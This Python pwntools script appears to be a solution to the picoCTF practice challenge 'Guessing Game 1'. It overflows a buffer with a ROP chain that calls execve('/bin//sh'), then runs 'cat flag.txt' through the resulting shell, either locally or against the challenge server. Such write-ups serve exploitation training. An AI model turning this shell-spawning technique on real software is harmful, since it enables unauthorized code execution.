#!/usr/bin/env python3

"""
Toast's submission for picoGym challenge Guessing Game 1.

This script can be used in the following manner:
python3 ./solve.py <REMOTE/LOCAL>

Args:
    param1: LOCAL will operate locally on the user's machine.
            REMOTE will connect to the CTF webserver and grab the flag.
            If no parameter is specified, the program will default to LOCAL.

Returns:
    The flag to solve the challenge.
"""

from pwn import *

exe = ELF("./vuln")

context.binary = exe
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']

def conn():
    '''Establish the connection to the process, local or remote.
    '''

    if args.get('REMOTE'):
        io = remote('jupiter.challenges.picoctf.org', 50581)
    elif args.get('GDB'):
        io = gdb.debug([exe.path])
    else:
        io = process([exe.path])

    return io


def main():
    flag = get_flag()
    log.success(flag)


def get_flag():
    '''Return the flag.
    '''
    with conn() as io:
        io.sendline(b"84")
        payload = b"A" * 120

        # 0x6ba0e0 Address of Data section
        # 0x400696 pop rdi; ret;
        payload += p64(0x400696) + p64(0x6ba0e0)

        # 0x410ca3 pop rsi; ret;
        payload += p64(0x410ca3) + b"/bin//sh"

        # 0x447d7b mov qword ptr [rdi], rsi; ret;
        payload += p64(0x447d7b)

        # 0x6ba0e8 address of DATA + 8
        # 0x410ca3 pop rsi; ret;
        payload += p64(0x410ca3) + p64(0x6ba0e8)

        # 0x6ba0e8 address of DATA + 8
        # 0x44cc26 pop rdx; ret;
        payload += p64(0x44cc26) + p64(0x6ba0e8)

        # 0x4163f4 pop rax; ret;
        payload += p64(0x4163f4) + p64(0x3b)

        # 0x40137c syscall;
        payload += p64(0x40137c)

        io.sendline(payload)

        io.recvuntil(b"\x06")
        io.recvuntil(b"@\n\n")
        io.sendline(b"cat flag.txt")
        flag = io.recvline()
        io.close()
        return flag.decode()


if __name__ == '__main__':
    main()
